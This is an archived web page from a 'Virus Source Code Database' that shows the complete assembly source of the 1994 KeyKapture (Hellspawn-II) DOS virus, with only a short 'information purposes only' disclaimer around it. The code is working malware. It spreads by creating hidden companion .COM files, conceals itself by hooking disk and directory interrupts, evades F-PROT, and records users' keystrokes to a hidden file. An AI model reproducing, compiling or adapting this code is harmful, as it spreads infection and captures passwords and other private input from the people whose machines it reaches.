<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: keykap_asm</title>
<meta name="KEYWORDS" content="keykap.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for keykap.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="kali-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kali-4_asm.php">kali-4_asm</a><br>
<a href="kaoshide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kaoshide_asm.php">kaoshide_asm</a><br>
<a href="k_cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k_cmos_asm.php">k_cmos_asm</a><br>
<a href="k-cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k-cmos_asm.php">k-cmos_asm</a><br>
<a href="keepacid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepacid_asm.php">keepacid_asm</a><br>
<a href="keepenem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepenem_asm.php">keepenem_asm</a><br>
<a href="keykap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykap_asm.php">keykap_asm</a><br>
<a href="keykapt2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykapt2_asm.php">keykapt2_asm</a><br>
<a href="keypress_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keypress_asm.php">keypress_asm</a><br>
<a href="kiis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kiis_asm.php">kiis_asm</a><br>
<a href="kildia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kildia_asm.php">kildia_asm</a><br>
<a href="kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_asm.php">kill_asm</a><br>
<a href="kill_br_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_br_asm.php">kill_br_asm</a><br>
<a href="kill_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_rep_asm.php">kill_rep_asm</a><br>
<a href="kinison__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison__asm.php">kinison__asm</a><br>
<a href="kinison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison_asm.php">kinison_asm</a><br>
<a href="kinniso__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinniso__asm.php">kinniso__asm</a><br>
<a href="kinnison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinnison_asm.php">kinnison_asm</a><br>
<a href="kinsn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinsn_asm.php">kinsn_asm</a><br>
<a href="kk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kk2_asm.php">kk2_asm</a><br>
<a href="kod4_129_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_129_asm.php">kod4_129_asm</a><br>
<a href="kod4_399_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_399_asm.php">kod4_399_asm</a><br>
<a href="kode4-1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-1__asm.php">kode4-1__asm</a><br>
<a href="kode4-2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-2__asm.php">kode4-2__asm</a><br>
<a href="kohn_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_6_asm.php">kohn_6_asm</a><br>
<a href="kohn_9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_9_asm.php">kohn_9_asm</a><br>
<a href="kompanio_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kompanio_asm.php">kompanio_asm</a><br>
<a href="krad_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krad_pas.php">krad_pas</a><br>
<a href="krtt41_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krtt41_asm.php">krtt41_asm</a><br>
<a href="krttdemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krttdemo_asm.php">krttdemo_asm</a><br>
<a href="kstest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kstest_asm.php">kstest_asm</a><br>
<a href="ksvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/ksvir_asm.php">ksvir_asm</a><br>
<a href="kuku_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kuku_bas.php">kuku_bas</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;                    KeyKapture Virus v0.90 (Hellspawn-II)
;                  (c) 1994 by Stormbringer [Phalcon/Skism]
;
;          This virus was written exclusively for Crypt Newsletter.
;
;  This virus is designed to aid in the capture of keystrokes on machines.
;It is probably best suited for a network environment - if it can be executed
;under root priveledges once, it will become _very_ effective.  It can capture
;up to 1k of keystrokes before it must be allowed to dump.  Dumping will be
;attempted when a disk change command is issued - strokes will be saved in
;a hidden file called KKV.90 in the current directory on the new drive (if 
;possible).  In most respects it is simply an improved version of Hellspawn,
;i.e. fully stealth companion.

.model tiny
.radix 16
.code
        org 100
start:
        jmp     EntryPoint        

FindZero:
        lodsb
        or      al,al
        jne     FindZero
        
        cmp     ds:[si-4],'XE'
        je      InfectOnOpen
        
        cmp     ds:[si-4],'OC'
        jne     Doneopen
        cmp     byte ptr ds:[si-2],'M'
        jne     Doneopen

OpenRequestedFile:
        mov     ax,3d00
        pushf
        call    dword ptr cs:[IP_21]
        xchg    bx,ax
        
        xor     cx,cx
        xor     dx,dx
        mov     ax,4202
        call    FakeInt21

        cmp     ax,endmain-start
        jne     CloseUp

        pop     di si ds es dx cx bx ax
        stc
        retf    002

CloseUp:
        jc      CloseUp
        mov     ah,3e
        call    FakeInt21
doneOPen:
        pop     di si ds es dx cx bx ax
        jmp     Go21

InfectOnOpen:
        pop     di si ds es dx cx bx ax
        jmp     Execute

NewOpen:
        push    ax bx cx dx es ds si di
        mov     dx,si
        jmp     FindZero
Open:
        push    ax bx cx dx es ds si di
        mov     si,dx
        jmp     FindZero

Terminateprog:
        mov     byte ptr cs:[StealthOn],1
        jmp     Go21


Int21:
        cmp     ah,0e
        jne     NotDump
        jmp     DumpKey
NotDump:
        cmp     ah,4c
        je      Terminateprog
        or      ah,ah
        je      Terminateprog
        cmp     byte ptr cs:[StealthOn],0
        je      AfterStealthChecks
        cmp     ah,11h
        je      FindFile
        cmp     ah,12h
        je      FindFile
        cmp     ah,4eh
        je      FindHandle
        cmp     ah,4fh
        je      FindHandle

AfterStealthChecks:       
        mov     word ptr cs:[filenameoff],si
        cmp     ax,6c00
        je      NewOpen
        mov     word ptr cs:[filenameoff],dx
        cmp     ah,3dh
        je      Open
        cmp     ax,4b00h
        jne     Go21
        jmp     Execute

Go21:        
        jmp     dword ptr cs:[IP_21]

FindHandle:
        pushf
        call    dword ptr cs:[IP_21]
        jc      ErrorHandleCall

        push    ax bx cx dx es ds si di
GetDTA:        
        mov     ah,2f
        call    FakeInt21

        cmp     word ptr es:[bx+1a],endmain-start       ;Check size
        jne     EndHandle

        mov     ah,byte ptr es:[bx+15]
        and     ah,2
        jz      Endhandle
        
        pop     di si ds es dx cx bx ax
        
        mov     ah,4f
        jmp     FindHandle

EndHandle:
        pop     di si ds es dx cx bx ax
        clc
DoneHandleStealth:
        retf    02

ErrorHandleCall:
        mov     ah,12
        retf    02

FindFile:
        call    FakeInt21
        cmp     al,0ff
        je      ErrorFF
        
Stealth:
        push    ax bx cx dx es ds si di
        
        mov     ah,2f
        call    FakeInt21

        cmp     byte ptr es:[bx],0ff
        jne     NotExtended
        add     bx,7
NotExtended:
        
        cmp     word ptr [bx+9],'OC'
        jne     DoneFF
        cmp     word ptr [bx+1dh],endmain-start
        jne     DoneFF

FindNextFile:                
        pop     di si ds es dx cx bx ax
        mov     ah,12
        jmp     FindFile

DoneFF:
        pop     di si ds es dx cx bx ax
        iret

ErrorFF:
        mov     al,0ff
        iret


Execute:
        push    ax bx cx dx es ds si di
        
        mov     dx,word ptr cS:[filenameoff]
        call    SetCritical        

        mov     si,dx
FindEndOfFilename:        
        lodsb
        or      al,al
        jne     FindEndOfFilename
        
CheckForCHKDSK:
        cmp     word ptr ds:[si-9],'DK'
        jne     AfterChkdsk

        mov     byte ptr cs:[StealthOn],0
        
AfterChkdsk:
        cmp     byte ptr ds:[si-0a],'-' ;If it's f-prot, exit
        je      EndExec

        cmp     word ptr ds:[si-4],'XE'
        jne     EndExec

        mov     si,dx
        mov     di,offset filename
        push    cs
        pop     es

CopyFilename:        
        lodsb
        stosb
        or      al,al
        jne     CopyFilename
        
        push    cs
        pop     ds

ChangeToCom:
        mov     word ptr es:[di-4],'OC'
        mov     byte ptr es:[di-2],'M'

CheckIfThere:
        mov     ax,3d00
        mov     dx,offset filename
        call    FakeInt21
        xchg    bx,ax
        jnc     CloseVirus

PlaceVirus:
        mov     ah,3c
        mov     cx,2
        mov     dx,offset Filename
        call    FakeInt21
        jc      EndEXEC

WriteVirus:
        xchg    bx,ax       
        mov     ah,40
        mov     cx,endmain-start
        mov     dx,100
        call    FakeInt21

CloseVirus:
        mov     ah,3e
        call    FakeInt21

EndExec:
        call    ResetCritical

        pop     di si ds es dx cx bx ax
        jmp     Go21


Error13:
        stc
        retf    02

Int13:        
        cmp     ah,02        
        je      IsDiskRead
        jmp     GoInt13

IsDiskRead:
        pushf
        call    dword ptr cs:[IP_13]
        jc      Error13
AbsStealth:
        push    ax bx cx dx es ds si di
        push    cs
        pop     ds
        mov     di,bx
        mov     si,100
        mov     cx,100
        repz    cmpsb
        jcxz    IsVirus
        jmp     DoneAbsStealth
IsVirus:
        mov     di,bx
        mov     ax,9090
        mov     cx,0fe
        repnz   stosw
        mov     ax,20cdh
        stosw

DoneAbsStealth:
        pop     di si ds es dx cx bx ax
        clc
        retf    002

EntryPoint:
        mov     word ptr [LetterPTR],offset keystrokes

        push    ds
        mov     ax,ds        
        dec     ax
        mov     ds,ax
        mov     byte ptr ds:[0],'Z'     ;Mark as last in chain
        sub     word ptr ds:[03],0c0     ;Allocate Space From MCB (3k)
        sub     word ptr ds:[12],0c0     ;Allocate Space From PSP (3k)
        xor     ax,ax        
        mov     ds,ax
        sub     word ptr ds:[413],3     ;Allocate Memory From Bios (3k)
        mov     ax,word ptr ds:[413]
        
CopyVirusToMem:        
        mov     cl,6
        shl     ax,cl
        sub     ax,10
        mov     es,ax
        pop     ds
        push    ds
        mov     si,100        
        mov     di,100
        mov     cx,end_prog-start
        repnz   movsb
        
;BX = IP of new int, CX = CS, DX = IntNum
;DI = address of interrupt storage
SetInterrupts:
        xor     ax,ax
        mov     ds,ax
        cli
SetInt21:        
        mov     ax,offset Int21
        mov     bx,es
        xchg    ax,word ptr ds:[21*4]
        xchg    bx,word ptr ds:[21*4+2]
        mov     word ptr es:[IP_21],ax
        mov     word ptr es:[CS_21],bx
SetInt13:
        mov     ax,offset Int13
        mov     bx,es
        xchg    ax,word ptr ds:[13*4]
        xchg    bx,word ptr ds:[13*4+2]
        mov     word ptr es:[IP_13],ax
        mov     word ptr es:[CS_13],bx

SetInt09:
        mov     ax,offset Int09
        mov     bx,es
        xchg    ax,word ptr ds:[09*4]
        xchg    bx,word ptr ds:[09*4+2]
        mov     word ptr es:[IP_09],ax
        mov     word ptr es:[CS_09],bx
        sti

        push    cs
        pop     ds

        mov     byte ptr cs:[StealthOn],1

RunOriginalProgram:
        mov     ax,ds:[2c]
        mov     ds,ax
        xor     si,si

FindPath:        
        lodsw
        or      ax,ax
        je      FoundPath
        dec     si
        jmp     FindPath

FoundPath:        
        lodsw

ChangeFilenameToEXE:        
        push    ds
        pop     es
        mov     di,si
        xor     al,al
        mov     cx,0ff
        repnz   scasb
        mov     word ptr es:[di-4],'XE'
        mov     byte ptr es:[di-2],'E'
        
        push    cs
        pop     es
        mov     ah,4a
        mov     bx,(end_prog-start+10f)/10
        int     21

        mov     cx,di
        sub     cx,si
        dec     cx
        mov     di,offset Filename
        mov     al,cl
        stosb
        repnz   movsb
        mov     byte ptr es:[di],0dh
        mov     si,offset Filename
        push    cs
        pop     ds

        int     2e                      ;Execute Command        
        
        mov     ax,4c00
        int     21

FakeInt21:
        pushf
        call    dword ptr cs:[IP_21]
        ret


SetCritical:
        push    ax bx ds
        xor     ax,ax
        mov     ds,ax
        mov     ax,offset CriticalHandler
        mov     bx,cs
        cli
        xchg    ds:[24*4],ax
        xchg    ds:[24*4+2],bx
        mov     word ptr cs:[CS_24],bx
        mov     word ptr cs:[IP_24],ax
        sti
        pop     ds bx ax
        ret

ResetCritical:
        push    ax bx ds
        xor     ax,ax
        mov     ds,ax
        mov     ax,word ptr cs:[IP_24]
        mov     bx,word ptr cs:[CS_24]
        cli
        mov     word ptr ds:[24*4],ax
        mov     word ptr ds:[24*4+2],bx
        sti
        pop     ds bx ax
        ret



CriticalHandler:
        mov     al,3
        iret

Int09:
        pushf
        call    dword ptr cs:[IP_09]

        push    ax bx cx dx si di es ds
        push    cs cs
        pop     es ds
        
        xor     bx,bx
        mov     ah,1            ;Check if chars are waiting
        int     16
        jz      No_Char
        
        mov     di,word ptr cs:[LetterPTR]
        cmp     di,offset endkeys
        jae     No_Char
        
        cmp     al,1ah                  ;Avoid EOF marks...
        je      No_Char

        stosb
        inc     word ptr cs:[LetterPTR]
        cmp     al,0dh
        jne     No_Char

        mov     al,0ah
        stosb
        inc     word ptr cs:[LetterPTR]
No_Char:        
        pop     ds es di si dx cx bx ax
        iret


DumpKey:
        pushf
        call    dword ptr cs:[IP_21]
        jc      DoneDump
        call    SetCritical
        push    ax bx cx dx es ds si di
        push    cs cs
        pop     es ds
        mov     ax,3d02
        mov     dx,offset Keyfile
        call    fakeint21
        jnc     FileThere
        mov     ah,3c
        mov     dx,offset Keyfile
        mov     cx,2
        call    fakeint21
        jc      DoneSave
FileThere:
        xchg    bx,ax
        mov     ax,4202
        xor     cx,cx
        xor     dx,dx
        call    fakeint21
        mov     dx,offset keystrokes
        mov     cx,letterptr
        sub     cx,dx
        mov     ah,40
        int     21
        mov     ah,3e
        int     21

        mov     word ptr [LetterPTR],offset keystrokes
DoneSave:
        pop     di si ds es dx cx bx ax
        call    ResetCritical
        clc
DoneDump:
        retf 2


keyFile    db      'KKV.90',0

Credits db      'KeyKapture Virus v0.90 [Hellspawn-II] (c) 1994 by Stormbringer [P/S]'
EndCred:

GoInt13:
        db      0ea
endmain:
IP_13   dw      ?
CS_13   dw      ?
IP_09   dw      ?
CS_09   dw      ?
IP_21   dw      ?
CS_21   dw      ?
CS_24   dw      ?
IP_24   dw      ?
LetterPTR dw    ?
filenameoff     dw      ?
StealthOn       db      ?
filename        db      50 dup(?)
keystrokes      db      400 dup(?)
endkeys:
end_prog:
end start

</textarea></td></tr></table></body></html>
